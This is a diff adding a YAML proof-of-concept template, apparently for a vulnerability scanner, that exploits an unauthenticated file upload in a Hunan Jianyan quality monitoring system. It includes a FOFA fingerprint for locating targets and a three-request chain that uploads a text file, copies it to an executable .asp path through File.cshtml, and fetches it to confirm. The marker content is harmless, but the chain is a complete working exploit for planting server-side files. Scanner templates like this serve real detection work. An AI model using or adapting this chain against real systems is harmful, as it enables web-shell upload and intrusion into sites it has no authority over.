@@ -1,0 +1,47 @@
+id: poc-yaml-hunanjianyan-applications-attachment-upload
+info:
+  name: 湖南建研质量监测系统/Applications/upload.ashx文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: 湖南建研检测系统
+  fofa: body="/Content/Theme/Standard/webSite/login.css"
+variables:
+  randstr: to_lower(random_str(10))
+requests:
+- method: POST
+  path: /Applications/Attachment/upload.ashx
+  headers:
+    Content-Type: multipart/form-data; boundary=------------------------OqjxWFlqvSLEefGwXuWeIHbrMYnLtTbqoIUbHXbR
+  data: '--------------------------OqjxWFlqvSLEefGwXuWeIHbrMYnLtTbqoIUbHXbR
+
+    Content-Disposition: form-data; name="file";filename="123.txt"
+
+
+    This website has a vulnerability
+
+    --------------------------OqjxWFlqvSLEefGwXuWeIHbrMYnLtTbqoIUbHXbR
+
+    Content-Disposition: form-data; name="_upload_guid"
+
+    123
+
+    --------------------------OqjxWFlqvSLEefGwXuWeIHbrMYnLtTbqoIUbHXbR--
+
+    '
+  output:
+  - regex_match(body,`/tempData/(?P<name>.*?).txt`)
+  expression: "status_code == 200 && \ncontains(body,\"\\\"files\\\"\") &&\ncontains(body,\"\
+    \\\"name\\\"\") \n"
+- method: POST
+  path: /Standard/Editor/API/File.cshtml?act=geturl
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: filename=/tempData/{{.randstr}}.asp&filetplpath=/tempData/{{.name}}.txt
+  expression: "status_code == 200 && \ncontains(body,\"\\\"code\\\"\") &&\ncontains(body,\"\
+    \\\"data\\\"\")\n"
+- method: GET
+  path: /tempData/{{.randstr}}.asp
+  expression: "status_code == 200 && \ncontains(body,\"This website has a vulnerability\"\
+    )\n"
+transport: http
